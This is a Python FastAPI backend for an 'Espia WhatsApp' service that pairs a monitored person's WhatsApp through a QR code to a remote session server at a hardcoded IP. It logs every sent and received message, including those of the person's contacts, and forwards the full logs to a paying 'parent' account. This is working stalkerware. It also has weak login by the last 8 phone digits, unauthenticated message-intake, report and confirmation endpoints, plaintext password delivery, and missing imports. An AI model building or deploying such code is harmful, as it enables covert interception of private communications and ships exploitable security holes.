from fastapi import FastAPI, Depends, HTTPException, status, Request
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, ARRAY
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session
from pydantic import BaseModel, validator
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext
import re
import os
from dotenv import load_dotenv
import qrcode
import base64
from io import BytesIO
import requests

load_dotenv()
SECRET_KEY = os.getenv("SECRET_KEY", "your-secret-key")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

app = FastAPI()
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/login")
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# SQLite Database
DATABASE_URL = "sqlite:///espia_whatsapp.db"
engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

# Database Models
class User(Base):
    __tablename__ = "usuarios"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, index=True)
    password = Column(String)
    plano = Column(String, default="Gratuito")
    whatsapp_pai = Column(String, unique=True)
    telefones_monitorados = Column(ARRAY(String), default=[])
    confirmado = Column(Boolean, default=False)
    data_criacao = Column(DateTime, default=datetime.utcnow)

class Filho(Base):
    __tablename__ = "filhos"
    id = Column(Integer, primary_key=True, index=True)
    username_pai = Column(String, index=True)
    nome_filho = Column(String)
    whatsapp_filho = Column(String)

class Mensagem(Base):
    __tablename__ = "mensagens_monitoradas"
    id = Column(Integer, primary_key=True, index=True)
    numero_filho = Column(String)
    tipo = Column(String)
    numero_contato = Column(String)
    conteudo = Column(String)
    horario = Column(DateTime)

Base.metadata.create_all(bind=engine)

# Pydantic Schemas
class UserCreate(BaseModel):
    username: str
    whatsapp_pai: str
    password: str
    confirm_password: str

    @validator("username")
    def validate_username(cls, v):
        if len(v) < 8:
            raise ValueError("Username deve ter pelo menos 8 caracteres")
        return v

    @validator("whatsapp_pai")
    def validate_whatsapp(cls, v):
        numero = v.replace("+55", "").replace("55", "")
        if not re.match(r"^\d{10,}$", numero):
            raise ValueError("Número de WhatsApp inválido. Inclua o DDD.")
        return numero

    @validator("password")
    def validate_password(cls, v):
        if not re.match(r"^(?=(?:.*(.))(?!.*\1).{7,})[a-z\d]{8,}$", v) or not re.search(r"\d", v):
            raise ValueError("A senha deve ter pelo menos 8 caracteres e 1 número")
        return v

    @validator("confirm_password")
    def passwords_match(cls, v, values):
        if "password" in values and v != values["password"]:
            raise ValueError("As senhas não coincidem")
        return v

class UserLogin(BaseModel):
    username: str
    password: str

class FilhoCreate(BaseModel):
    numero: str
    nome_filho: str

    @validator("numero")
    def validate_numero(cls, v):
        numero = v.replace("+55", "").replace("55", "")
        if not re.match(r"^\d{10,}$", numero):
            raise ValueError("Número inválido. Inclua o DDD.")
        return numero

    @validator("nome_filho")
    def validate_nome(cls, v):
        if not v:
            raise ValueError("O nome do filho é obrigatório")
        return v

class Token(BaseModel):
    access_token: str
    token_type: str

# Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# JWT Functions
def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise HTTPException(status_code=401, detail="Token inválido")
    except JWTError:
        raise HTTPException(status_code=401, detail="Token inválido")
    
    user = db.query(User).filter(User.username == username).first()
    if user is None:
        raise HTTPException(status_code=401, detail="Usuário não encontrado")
    return user

# Routes
@app.post("/login", response_model=Token)
async def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
    username = form_data.username
    if len(username) < 8:
        raise HTTPException(status_code=400, detail="Username inválido: deve ter pelo menos 8 caracteres")
    
    ultimos_8 = username[-8:]
    user = db.query(User).filter(User.whatsapp_pai.endswith(ultimos_8)).first()
    
    if not user or not pwd_context.verify(form_data.password, user.password):
        raise HTTPException(status_code=400, detail="Login inválido")
    
    access_token = create_access_token(data={"sub": user.username})
    return {"access_token": access_token, "token_type": "bearer"}

@app.post("/register")
async def register(user: UserCreate, db: Session = Depends(get_db)):
    numero = user.whatsapp_pai
    hashed_password = pwd_context.hash(user.password)
    
    db_user = User(
        username=user.username,
        password=hashed_password,
        whatsapp_pai=numero,
        plano="Gratuito",
        telefones_monitorados=[],
        confirmado=False,
        data_criacao=datetime.utcnow()
    )
    
    try:
        db.add(db_user)
        db.commit()
        db.refresh(db_user)
    except:
        db.rollback()
        raise HTTPException(status_code=400, detail="Usuário já existe")
    
    for num in [numero, f"{numero[:2]}9{numero[2:]}", f"{numero[:2]}{numero[2:][1:]}"]:
        try:
            confirmacao_url = f"https://detetivewhatsapp.com/confirmar-numero/+55{num}"
            mensagem = f"Confirme seu número de WhatsApp clicando no link: {confirmacao_url}"
            response = requests.post("http://147.93.4.219:3000/enviar-confirmacao", json={
                "numeros": [f"+55{num}"],
                "mensagem": mensagem
            }, timeout=10)
            response.raise_for_status()
        except Exception as e:
            print(f"Erro ao enviar mensagem de confirmação para +55{num}: {str(e)}")
    
    access_token = create_access_token(data={"sub": user.username})
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/confirmar-numero/{numero}")
async def confirmar_numero(numero: str, db: Session = Depends(get_db)):
    numero = numero.replace("+55", "").replace("55", "")
    if not re.match(r"^\d{10,}$", numero):
        raise HTTPException(status_code=400, detail="Número inválido")
    
    ultimos_8 = numero[-8:]
    user = db.query(User).filter(User.whatsapp_pai.endswith(ultimos_8)).first()
    
    if user:
        user.whatsapp_pai = numero
        user.confirmado = True
        db.commit()
        return {"status": "Número confirmado com sucesso"}
    raise HTTPException(status_code=404, detail="Usuário não encontrado")

@app.get("/logout")
async def logout():
    return {"status": "Logout bem-sucedido"}

@app.get("/painel")
async def painel(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    filhos = []
    for idx, numero in enumerate(current_user.telefones_monitorados or []):
        filho = db.query(Filho).filter(Filho.username_pai == current_user.username, Filho.whatsapp_filho == numero).first()
        filhos.append({
            "id": idx + 1,
            "numero_whatsapp": numero,
            "nome_filho": filho.nome_filho if filho else "Sem nome"
        })
    
    limites = {"Gratuito": 1, "Pro": 1, "Premium": 3}
    max_filhos = limites.get(current_user.plano, 1)
    
    mensagem_confirmacao = None if current_user.confirmado else "Confirme seu número de WhatsApp."
    dias_restantes = None
    comprar_agora = False
    
    if current_user.plano == "Gratuito":
        dias_passados = (datetime.utcnow() - current_user.data_criacao).days
        dias_restantes = max(0, 2 - dias_passados)
        comprar_agora = dias_restantes == 0
    
    return {
        "session_id": current_user.whatsapp_pai,
        "plano": current_user.plano,
        "filhos": filhos,
        "max_filhos": max_filhos,
        "mensagem_confirmacao": mensagem_confirmacao,
        "dias_restantes": dias_restantes,
        "comprar_agora": comprar_agora
    }

@app.post("/adicionar-filho")
async def adicionar_filho(filho: FilhoCreate, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    if current_user.plano == "Gratuito" and (datetime.utcnow() - current_user.data_criacao).days > 2:
        raise HTTPException(status_code=403, detail="Período de teste gratuito expirado")
    
    limites = {"Gratuito": 1, "Pro": 1, "Premium": 3}
    max_filhos = limites.get(current_user.plano, 1)
    
    if len(current_user.telefones_monitorados or []) >= max_filhos:
        raise HTTPException(status_code=400, detail="Limite de filhos atingido")
    
    if filho.numero in (current_user.telefones_monitorados or []):
        raise HTTPException(status_code=400, detail="Número já cadastrado")
    
    current_user.telefones_monitorados = (current_user.telefones_monitorados or []) + [filho.numero]
    db_filho = Filho(
        username_pai=current_user.username,
        nome_filho=filho.nome_filho,
        whatsapp_filho=filho.numero
    )
    
    try:
        db.add(db_filho)
        db.commit()
        db.commit()  # Commit user changes
    except:
        db.rollback()
        raise HTTPException(status_code=400, detail="Erro ao adicionar filho")
    
    return {"status": "Filho adicionado com sucesso"}

@app.post("/excluir-filho/{filho_id}")
async def excluir_filho(filho_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    filhos = current_user.telefones_monitorados or []
    if filho_id <= 0 or filho_id > len(filhos):
        raise HTTPException(status_code=400, detail="ID de filho inválido")
    
    numero_filho = filhos[filho_id - 1]
    filhos.pop(filho_id - 1)
    current_user.telefones_monitorados = filhos
    
    db.query(Filho).filter(Filho.username_pai == current_user.username, Filho.whatsapp_filho == numero_filho).delete()
    
    try:
        response = requests.post("http://147.93.4.219:3000/excluir-sessao", json={"numero": f"+55{numero_filho}"}, timeout=10)
        response.raise_for_status()
    except Exception as e:
        print(f"Erro ao excluir sessão para +55{numero_filho}: {str(e)}")
    
    try:
        db.commit()
    except:
        db.rollback()
        raise HTTPException(status_code=500, detail="Erro ao excluir filho")
    
    return {"status": "Filho excluído com sucesso"}

@app.get("/solicitar-qrcode/{numero}")
async def solicitar_qrcode(numero: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    numero = numero.replace("+55", "").replace("55", "")
    if not re.match(r"^\d{10,}$", numero):
        raise HTTPException(status_code=400, detail="Número inválido")
    
    if numero not in (current_user.telefones_monitorados or []):
        raise HTTPException(status_code=403, detail="Número não autorizado")
    
    try:
        response = requests.get(f"http://147.93.4.219:3000/qrcode/+55{numero}?force=true", timeout=15)
        response.raise_for_status()
        data = response.json()
        return {"qrcode": data.get("qrcode", "")}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro ao solicitar QR code: {str(e)}")

@app.post("/status-conexao")
async def status_conexao(request: Request, current_user: User = Depends(get_current_user)):
    try:
        numeros = (await request.json()).get("numeros", [])
        status_resultados = {}
        for numero in numeros:
            numero = numero.replace("+55", "").replace("55", "")
            ultimos_8 = numero[-8:]
            try:
                resp = requests.get(f"http://147.93.4.219:3000/status-sessao-por-digitos/{ultimos_8}", timeout=5)
                dados = resp.json()
                status_resultados[f"+55{numero}"] = dados.get("conectado", False)
            except:
                status_resultados[f"+55{numero}"] = False
        return status_resultados
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro: {str(e)}")

@app.post("/desconectar/{numero}")
async def desconectar(numero: str, current_user: User = Depends(get_current_user)):
    numero = numero.replace("+55", "").replace("55", "")
    ultimos_8 = numero[-8:]
    if not ultimos_8.isdigit() or len(ultimos_8) != 8:
        raise HTTPException(status_code=400, detail="Últimos 8 dígitos inválidos")
    
    try:
        response = requests.post("http://147.93.4.219:3000/excluir-sessoes-por-digitos", json={"ultimos8": ultimos_8}, timeout=10)
        response.raise_for_status()
        return {"status": "Sessões desconectadas com sucesso"}
    except Exception as e:
        print(f"Erro ao desconectar sessões para últimos 8 dígitos {ultimos_8}: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao desconectar sessões: {str(e)}")

@app.post("/mensagem-recebida")
async def mensagem_recebida(request: Request, db: Session = Depends(get_db)):
    data = await request.json()
    numero_filho = data.get("para", "").replace("@s.whatsapp.net", "").replace("+55", "").replace("55", "")
    numero_contato = data.get("de", "").replace("@s.whatsapp.net", "").replace("+55", "").replace("55", "")
    conteudo = data.get("texto")
    horario_str = data.get("horario")
    tipo = data.get("tipo")
    
    if not all([numero_filho, numero_contato, conteudo, horario_str, tipo]):
        raise HTTPException(status_code=400, detail="Dados incompletos")
    
    try:
        horario = datetime.fromisoformat(horario_str.replace("Z", "+00:00"))
    except:
        raise HTTPException(status_code=400, detail="Formato de horário inválido")
    
    if tipo not in ["recebida", "enviada"]:
        raise HTTPException(status_code=400, detail="Tipo inválido")
    
    if numero_contato == "67920008280":
        return {"status": "Mensagem ignorada (destinatário oficial)"}
    
    mensagem = Mensagem(
        numero_filho=numero_filho,
        tipo=tipo,
        numero_contato=numero_contato,
        conteudo=conteudo,
        horario=horario
    )
    
    try:
        db.add(mensagem)
        db.commit()
    except:
        db.rollback()
        raise HTTPException(status_code=500, detail="Erro ao salvar mensagem")
    
    return {"status": "Mensagem salva com sucesso"}

@app.get("/disparar-relatorios")
async def disparar_relatorios(db: Session = Depends(get_db)):
    usuarios = db.query(User).filter(User.whatsapp_pai != None).all()
    
    for user in usuarios:
        if not user.telefones_monitorados or (user.plano == "Gratuito" and (datetime.utcnow() - user.data_criacao).days > 2):
            continue
        
        for numero_filho in user.telefones_monitorados:
            ultimos_8 = numero_filho[-8:]
            ddd_filho = numero_filho[:2]
            
            filho = db.query(Filho).filter(Filho.username_pai == user.username, Filho.whatsapp_filho == numero_filho).first()
            nome_filho = filho.nome_filho if filho else "Sem nome"
            
            mensagens = db.query(Mensagem).filter(Mensagem.numero_filho.endswith(ultimos_8), Mensagem.numero_filho[:2] == ddd_filho).order_by(Mensagem.horario.desc()).all()
            
            if not mensagens:
                continue
            
            corpo = f"*Relatório para o filho {nome_filho}, número {numero_filho}*\n\n"
            for msg in mensagens:
                corpo += f"[{msg.horario.strftime('%d/%m/%Y %H:%M')}] {msg.numero_contato}: {msg.conteudo}\n"
            
            try:
                response = requests.post("http://147.93.4.219:3000/enviar-relatorio", json={
                    "numero_destino": f"+55{user.whatsapp_pai}",
                    "mensagem": corpo
                }, timeout=10)
                response.raise_for_status()
                db.query(Mensagem).filter(Mensagem.numero_filho.endswith(ultimos_8), Mensagem.numero_filho[:2] == ddd_filho).delete()
                db.commit()
            except Exception as e:
                print(f"Erro ao enviar relatório para +55{user.whatsapp_pai}: {str(e)}")
    
    return {"status": "Relatórios processados"}

@app.get("/admin")
async def admin(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    if current_user.id != 1:
        raise HTTPException(status_code=403, detail="Acesso não autorizado")
    
    usuarios = db.query(User).all()
    return {"usuarios": [{
        "id": u.id,
        "username": u.username,
        "plano": u.plano,
        "whatsapp_pai": u.whatsapp_pai,
        "telefones_monitorados": u.telefones_monitorados,
        "confirmado": u.confirmado,
        "data_criacao": u.data_criacao
    } for u in usuarios]}

@app.post("/admin")
async def update_admin(usuarios: list[dict], current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    if current_user.id != 1:
        raise HTTPException(status_code=403, detail="Acesso não autorizado")
    
    for u in usuarios:
        user_id = u.get("id")
        username = u.get("username")
        
        if not username:
            db.query(User).filter(User.id == user_id).delete()
            continue
        
        user = db.query(User).filter(User.id == user_id).first()
        if not user:
            continue
        
        user.username = username
        if u.get("password"):
            user.password = pwd_context.hash(u["password"])
        user.plano = u.get("plano", "Gratuito")
        user.whatsapp_pai = u.get("whatsapp_pai").replace("+55", "").replace("55", "")
        user.telefones_monitorados = [num.replace("+55", "").replace("55", "") for num in u.get("telefones_monitorados", [])]
        user.confirmado = u.get("confirmado", False)
        user.data_criacao = u.get("data_criacao", datetime.utcnow())
    
    try:
        db.commit()
    except:
        db.rollback()
        raise HTTPException(status_code=500, detail="Erro ao atualizar usuários")
    
    return {"status": "Usuários atualizados com sucesso"}

@app.post("/forgot_password")
async def forgot_password(whatsapp_pai: str, db: Session = Depends(get_db)):
    whatsapp_pai = whatsapp_pai.replace("+55", "").replace("55", "")
    if not re.match(r"^\d{10,}$", whatsapp_pai):
        raise HTTPException(status_code=400, detail="Número de WhatsApp inválido. Inclua o DDD.")
    
    user = db.query(User).filter(User.whatsapp_pai == whatsapp_pai).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    new_password = ''.join(random.choices(string.ascii_letters + string.digits, k=7))
    user.password = pwd_context.hash(new_password)
    
    try:
        response = requests.post("http://147.93.4.219:3000/enviar-confirmacao", json={
            "numeros": [f"+55{whatsapp_pai}"],
            "mensagem": f"Sua nova senha do Espia WhatsApp é: {new_password}"
        }, timeout=10)
        response.raise_for_status()
        db.commit()
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Erro ao enviar nova senha: {str(e)}")
    
    return {"status": "Nova senha enviada com sucesso"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
